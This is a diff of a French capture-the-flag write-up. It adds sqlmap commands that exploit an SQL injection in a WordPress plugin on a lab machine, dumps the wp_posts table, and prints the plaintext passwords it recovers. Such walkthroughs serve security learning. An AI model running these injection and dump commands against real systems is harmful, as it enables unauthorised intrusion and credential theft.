@@ -122,7 +122,7 @@ Essayons de générer une erreur SQL via le paramètre query :
 
 ![error_sql](https://i.imgur.com/EEfQJrb.png)
 
-Nous sommes maintenant certain qu'une injection SQL est possible. Sortons [sqlmap](https://github.com/sqlmapproject/sqlmap) ! 😄
+Nous sommes maintenant certain qu'une injection SQL est possible. Déployons [sqlmap](https://github.com/sqlmapproject/sqlmap) ! 😄
 
 ```sh
 ❯ sqlmap -u http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php\?query\=1337 --dbs
@@ -143,6 +143,30 @@ available databases [8]:
 [*] sys
 [*] wordpress
 [*] wordpressdb
+```
+
+Nous avons trouvé des databases intéréssantes. Après avoir fouillé, j'ai donc trouvé quelque chose d'intéréssant :
+
+```sh
+❯ sqlmap -u http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php\?query\=1337 -D wordpress -T wp_posts --dump
+Database: wordpress
+Table: wp_posts
+Needed somewhere to put some passwords quickly\r\n\r\nZxJyhGem4k338S2Y\r\n\r\nenterprisencc170\r\n\r\nZD3YxfnSjezg67JZ\r\n\r\nu*Z14ru0p#ttj83zS6\r\n\r\n \r\n\r\n
+```
+
+Cependant à cause des End Of Line, les mot de passe sont difficilement lisibles, j'ai donc simplement echo cette chaine de caractère en bash :
+
+```sh
+❯ echo 'Needed somewhere to put some passwords quickly\r\n\r\nZxJyhGem4k338S2Y\r\n\r\nenterprisencc170\r\n\r\nZD3YxfnSjezg67JZ\r\n\r\nu*Z14ru0p#ttj83zS6\r\n\r\n \r\n\r\n'
+Needed somewhere to put some passwords quickly
+
+ZxJyhGem4k338S2Y
+
+enterprisencc170
+
+ZD3YxfnSjezg67JZ
+
+u*Z14ru0p#ttj83zS6
 ```
 
 # Vertical Privilege Escalation
